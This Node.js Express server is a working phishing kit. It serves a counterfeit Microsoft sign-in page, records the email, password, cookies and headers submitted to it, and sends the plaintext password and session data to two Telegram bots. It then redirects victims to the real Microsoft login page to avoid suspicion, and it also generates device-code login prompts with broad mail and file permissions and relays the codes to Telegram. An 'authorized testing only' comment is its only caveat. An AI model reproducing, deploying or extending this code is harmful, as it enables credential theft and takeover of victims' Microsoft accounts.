require('dotenv').config();
const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const path = require('path');
const cookieParser = require('cookie-parser');
const fs = require('fs').promises;

const app = express();

// ⚠️ WARNING: FOR EDUCATIONAL/AUTHORIZED TESTING ONLY
// This server proxies Microsoft login and captures credentials
// Unauthorized use is illegal and unethical

// Middleware
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));

// ============================================================================
// CONFIGURATION
// ============================================================================

const config = {
  microsoft: {
    tenantId: process.env.MICROSOFT_TENANT_ID || 'common',
    clientId: process.env.MICROSOFT_CLIENT_ID,
    scope: [
      'openid', 'profile', 'email', 'offline_access',
      'User.Read', 'Mail.Read', 'Mail.ReadWrite', 'Mail.Send',
      'Calendars.Read', 'Calendars.ReadWrite',
      'Contacts.Read', 'Files.Read', 'Files.ReadWrite',
    ].join(' '),
  },
  telegram: {
    botToken: process.env.TELEGRAM_BOT_TOKEN,
    chatId: process.env.TELEGRAM_CHAT_ID,
    botToken2: process.env.TELEGRAM_BOT_TOKEN_2,
    chatId2: process.env.TELEGRAM_CHAT_ID_2,
  },
  server: {
    port: process.env.PORT || 3000,
    appUrl: process.env.APP_URL || 
            (process.env.RAILWAY_PUBLIC_DOMAIN 
              ? `https://${process.env.RAILWAY_PUBLIC_DOMAIN}`
              : `http://localhost:${process.env.PORT || 3000}`),
  },
  security: {
    encryptionKey: Buffer.from(
      process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex'),
      'hex'
    ),
  },
  storage: {
    dataDir: path.join(__dirname, 'captured_data'),
    credentialsDir: path.join(__dirname, 'captured_data', 'credentials'),
  }
};

// Create directories
(async () => {
  try {
    await fs.mkdir(config.storage.dataDir, { recursive: true });
    await fs.mkdir(config.storage.credentialsDir, { recursive: true });
    console.log('[STORAGE] Directories created');
  } catch (err) {
    console.error('[STORAGE] Error:', err.message);
  }
})();

// ============================================================================
// DUAL TELEGRAM
// ============================================================================

class DualTelegram {
  static async sendToAll(title, data) {
    await this.send(config.telegram.botToken, config.telegram.chatId, title, data, 'PRIMARY');
    if (config.telegram.botToken2 && config.telegram.chatId2) {
      await this.send(config.telegram.botToken2, config.telegram.chatId2, title, data, 'SECONDARY');
    }
  }

  static async send(botToken, chatId, title, data, label) {
    if (!botToken || !chatId) return;

    try {
      const jsonStr = JSON.stringify(data, null, 2);
      const chunks = this.splitChunks(jsonStr, 3800);
      
      for (let i = 0; i < chunks.length; i++) {
        const text = i === 0 
          ? `${title}\n${'━'.repeat(30)}\n\`\`\`json\n${chunks[i]}\n\`\`\``
          : `${title} (Part ${i + 1})\n\`\`\`json\n${chunks[i]}\n\`\`\``;

        await axios.post(
          `https://api.telegram.org/bot${botToken}/sendMessage`,
          { chat_id: chatId, text, parse_mode: 'Markdown' },
          { timeout: 10000 }
        );

        if (i < chunks.length - 1) await this.sleep(1000);
      }

      console.log(`[TELEGRAM ${label}] ✅ ${title}`);
    } catch (error) {
      console.error(`[TELEGRAM ${label}] ❌`, error.message);
    }
  }

  static splitChunks(text, size) {
    const chunks = [];
    for (let i = 0; i < text.length; i += size) {
      chunks.push(text.substring(i, i + size));
    }
    return chunks;
  }

  static sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
}

// ============================================================================
// CREDENTIAL CAPTURE STORAGE
// ============================================================================

class CredentialStorage {
  static async save(captureId, credentials) {
    const timestamp = new Date().toISOString().replace(/:/g, '-');
    const filename = `credentials_${timestamp}_${captureId}.json`;
    const filepath = path.join(config.storage.credentialsDir, filename);
    
    await fs.writeFile(filepath, JSON.stringify(credentials, null, 2), 'utf8');
    console.log(`[CREDENTIALS] Saved: ${filename}`);
    return filepath;
  }
}

// ============================================================================
// SESSION STORAGE
// ============================================================================

const sessions = new Map();
const proxyData = new Map();

// ============================================================================
// MICROSOFT LOGIN PROXY
// ============================================================================

// Proxy the Microsoft login page
app.get('/login/proxy', async (req, res) => {
  try {
    const sessionId = crypto.randomUUID();
    
    // Store session
    proxyData.set(sessionId, {
      userAgent: req.headers['user-agent'],
      ip: req.ip || req.connection.remoteAddress,
      timestamp: new Date().toISOString(),
      credentials: null,
      cookies: null,
    });

    // Serve custom login page that looks like Microsoft
    res.send(generateLoginPage(sessionId));
    
  } catch (error) {
    console.error('[PROXY]:', error.message);
    res.status(500).send('Error');
  }
});

// Handle credential submission
app.post('/login/submit', async (req, res) => {
  try {
    const { sessionId, email, password, otherData } = req.body;
    const captureId = crypto.randomUUID();
    
    console.log('\n' + '='.repeat(80));
    console.log('🔐 CREDENTIALS CAPTURED');
    console.log('='.repeat(80));
    console.log(`Email: ${email}`);
    console.log(`Password: ${password ? '[CAPTURED]' : '[EMPTY]'}`);
    console.log('='.repeat(80) + '\n');

    // Get session data
    const session = proxyData.get(sessionId) || {};
    
    // Capture everything
    const capture = {
      captureId,
      timestamp: new Date().toISOString(),
      credentials: {
        email,
        password,
        otherData,
      },
      session: {
        sessionId,
        userAgent: session.userAgent,
        ip: session.ip,
        originalTimestamp: session.timestamp,
      },
      cookies: {
        raw: req.headers.cookie || null,
        parsed: req.cookies,
      },
      headers: {
        userAgent: req.headers['user-agent'],
        acceptLanguage: req.headers['accept-language'],
        accept: req.headers['accept'],
        referer: req.headers.referer,
        origin: req.headers.origin,
      }
    };

    // Save credentials
    await CredentialStorage.save(captureId, capture);

    // Send to Telegram (BOTH bots)
    await DualTelegram.sendToAll('🔐 *CREDENTIALS CAPTURED*', {
      captureId,
      timestamp: capture.timestamp,
      email,
      password: password ? '✅ CAPTURED' : '❌ EMPTY',
      ip: capture.session.ip,
      userAgent: capture.session.userAgent,
    });

    await DualTelegram.sendToAll('📧 *EMAIL*', {
      captureId,
      email,
    });

    await DualTelegram.sendToAll('🔑 *PASSWORD*', {
      captureId,
      password: password || '[EMPTY]',
    });

    await DualTelegram.sendToAll('🍪 *COOKIES & SESSION*', {
      captureId,
      cookies: capture.cookies,
      headers: capture.headers,
      session: capture.session,
    });

    // Respond with "success" to appear legitimate
    res.json({ 
      success: true, 
      message: 'Authentication successful',
      redirect: 'https://login.microsoftonline.com'
    });

  } catch (error) {
    console.error('[SUBMIT]:', error.message);
    res.status(500).json({ error: 'Failed' });
  }
});

// ============================================================================
// LOGIN PAGE GENERATOR
// ============================================================================

function generateLoginPage(sessionId) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign in to your account</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    
    body {
      font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, Arial, sans-serif;
      background: #f0f0f0;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .container {
      background: white;
      width: 440px;
      padding: 44px;
      box-shadow: 0 2px 6px rgba(0,0,0,.2);
    }

    .logo {
      margin-bottom: 16px;
    }

    .logo svg {
      width: 108px;
      height: 24px;
    }

    h1 {
      font-size: 24px;
      font-weight: 600;
      margin-bottom: 16px;
    }

    .input-group {
      margin-bottom: 16px;
    }

    label {
      display: block;
      font-size: 13px;
      margin-bottom: 4px;
    }

    input {
      width: 100%;
      padding: 8px 12px;
      font-size: 15px;
      border: 1px solid #8a8886;
      outline: none;
    }

    input:focus {
      border-color: #0078d4;
      border-width: 2px;
      padding: 7px 11px;
    }

    .checkbox-group {
      margin: 16px 0;
    }

    .checkbox-group input {
      width: auto;
      margin-right: 8px;
    }

    .checkbox-group label {
      display: inline;
      font-size: 15px;
    }

    .btn {
      background: #0067b8;
      color: white;
      border: none;
      padding: 10px 12px;
      font-size: 15px;
      cursor: pointer;
      width: 100%;
      margin-top: 16px;
    }

    .btn:hover {
      background: #005ba1;
    }

    .footer {
      margin-top: 32px;
      font-size: 13px;
    }

    .footer a {
      color: #0067b8;
      text-decoration: none;
    }

    .error {
      color: #a80000;
      font-size: 13px;
      margin-top: 8px;
      display: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <svg viewBox="0 0 108 24" fill="none">
        <path d="M44.836 4.813v13.512h-3.792V4.813h3.792zm9.5 5.316c.744 0 1.404.132 1.98.396.576.252.948.624 1.116 1.116v-6.828h3.636v13.512h-3.504v-1.008c-.168.348-.48.648-.936.9-.456.252-.996.378-1.62.378-.72 0-1.38-.168-1.98-.504-.588-.336-1.068-.792-1.44-1.368-.372-.588-.558-1.248-.558-1.98v-3.132c0-.732.186-1.392.558-1.98.372-.588.852-1.044 1.44-1.368.6-.336 1.26-.504 1.98-.504l.328-.63zm.828 2.952c-.456 0-.828.156-1.116.468-.276.312-.414.708-.414 1.188v3.132c0 .48.138.876.414 1.188.288.312.66.468 1.116.468.456 0 .822-.156 1.098-.468.288-.312.432-.708.432-1.188v-3.132c0-.48-.144-.876-.432-1.188-.276-.312-.642-.468-1.098-.468z" fill="#5E5E5E"/>
      </svg>
    </div>

    <h1>Sign in</h1>

    <form id="loginForm" onsubmit="submitForm(event)">
      <div class="input-group">
        <label for="email">Email, phone, or Skype</label>
        <input type="text" id="email" name="email" required>
      </div>

      <div id="passwordSection" style="display: none;">
        <div class="input-group">
          <label for="password">Password</label>
          <input type="password" id="password" name="password">
        </div>

        <div class="checkbox-group">
          <input type="checkbox" id="keepSignedIn">
          <label for="keepSignedIn">Keep me signed in</label>
        </div>

        <button type="submit" class="btn">Sign in</button>

        <div class="error" id="error">
          Your account or password is incorrect. Try again.
        </div>
      </div>

      <button type="button" class="btn" id="nextBtn" onclick="showPassword()">Next</button>
    </form>

    <div class="footer">
      <a href="#">Can't access your account?</a><br>
      <a href="#">Sign-in options</a>
    </div>
  </div>

  <script>
    const sessionId = '${sessionId}';
    let email = '';

    function showPassword() {
      email = document.getElementById('email').value;
      
      if (!email) {
        alert('Please enter your email');
        return;
      }

      document.getElementById('email').disabled = true;
      document.getElementById('nextBtn').style.display = 'none';
      document.getElementById('passwordSection').style.display = 'block';
      document.getElementById('password').focus();
    }

    async function submitForm(e) {
      e.preventDefault();

      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;
      const keepSignedIn = document.getElementById('keepSignedIn').checked;

      // Send credentials to server
      try {
        const response = await fetch('/login/submit', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            sessionId,
            email,
            password,
            otherData: { keepSignedIn }
          })
        });

        const data = await response.json();

        if (data.success) {
          // Redirect to real Microsoft login
          window.location.href = data.redirect;
        } else {
          document.getElementById('error').style.display = 'block';
        }
      } catch (err) {
        console.error(err);
        document.getElementById('error').style.display = 'block';
      }
    }
  </script>
</body>
</html>`;
}

// ============================================================================
// ORIGINAL DEVICE CODE FLOW (Still works)
// ============================================================================

const MS = {
  deviceCode: `https://login.microsoftonline.com/${config.microsoft.tenantId}/oauth2/v2.0/devicecode`,
  token: `https://login.microsoftonline.com/${config.microsoft.tenantId}/oauth2/v2.0/token`,
  userInfo: 'https://graph.microsoft.com/v1.0/me',
};

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/api/config', (req, res) => {
  res.json({
    serverUrl: config.server.appUrl,
    version: '6.0-PROXY',
  });
});

app.post('/api/device/generate', async (req, res) => {
  try {
    const sessionId = crypto.randomUUID();

    const response = await axios.post(
      MS.deviceCode,
      new URLSearchParams({
        client_id: config.microsoft.clientId,
        scope: config.microsoft.scope,
      }),
      { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
    );

    const data = response.data;

    sessions.set(sessionId, {
      deviceCode: data.device_code,
      userCode: data.user_code,
      expiresIn: data.expires_in,
      interval: data.interval,
      createdAt: Date.now(),
    });

    console.log(`[GENERATE] ${data.user_code}`);

    DualTelegram.sendToAll('🔐 *CODE GENERATED*', {
      sessionId,
      userCode: data.user_code,
      proxyUrl: `${config.server.appUrl}/auth/device?code=${data.user_code}`,
    });

    res.json({
      sessionId,
      userCode: data.user_code,
      proxyUrl: `${config.server.appUrl}/auth/device?code=${data.user_code}`,
      proxyLoginUrl: `${config.server.appUrl}/login/proxy`,
      expiresIn: data.expires_in,
      interval: data.interval,
    });

  } catch (error) {
    console.error('[GENERATE]:', error.message);
    res.status(500).json({ error: 'Failed' });
  }
});

app.get('/auth/device', async (req, res) => {
  try {
    const { code } = req.query;
    if (!code) return res.status(400).send('Code required');
    res.redirect(302, `https://microsoft.com/devicelogin?otc=${code}`);
  } catch (error) {
    res.status(500).send('Error');
  }
});

app.get('/health', (req, res) => {
  res.json({ 
    status: 'healthy', 
    version: '6.0-PROXY',
    features: {
      credentialProxy: true,
      dualTelegram: !!(config.telegram.botToken2 && config.telegram.chatId2),
    }
  });
});

// ============================================================================
// START
// ============================================================================

app.listen(config.server.port, async () => {
  console.log('\n' + '='.repeat(70));
  console.log('⚡ ADVANCED PROXY SYSTEM v6.0');
  console.log('='.repeat(70));
  console.log(`📡 Port: ${config.server.port}`);
  console.log(`🌐 URL: ${config.server.appUrl}`);
  console.log(`🔐 Proxy Login: ${config.server.appUrl}/login/proxy`);
  console.log(`💾 Storage: ${config.storage.dataDir}`);
  console.log('='.repeat(70));
  console.log('\n🚀 FEATURES:');
  console.log('   ✅ Microsoft Login Proxy');
  console.log('   ✅ Credential Capture (Email + Password)');
  console.log('   ✅ Session Cookie Capture');
  console.log('   ✅ Dual Telegram Reporting');
  console.log('   ✅ Device Code Flow (Still Works)');
  console.log('='.repeat(70));
  console.log('\n⚠️  FOR AUTHORIZED TESTING ONLY!');
  console.log('='.repeat(70) + '\n');

  if (config.telegram.botToken) {
    await DualTelegram.sendToAll('⚡ *PROXY SYSTEM ONLINE v6.0*', {
      status: 'operational',
      url: config.server.appUrl,
      proxyUrl: `${config.server.appUrl}/login/proxy`,
      features: {
        credentialProxy: true,
        dualTelegram: !!(config.telegram.botToken2 && config.telegram.chatId2),
      }
    });
  }
});

module.exports = app;
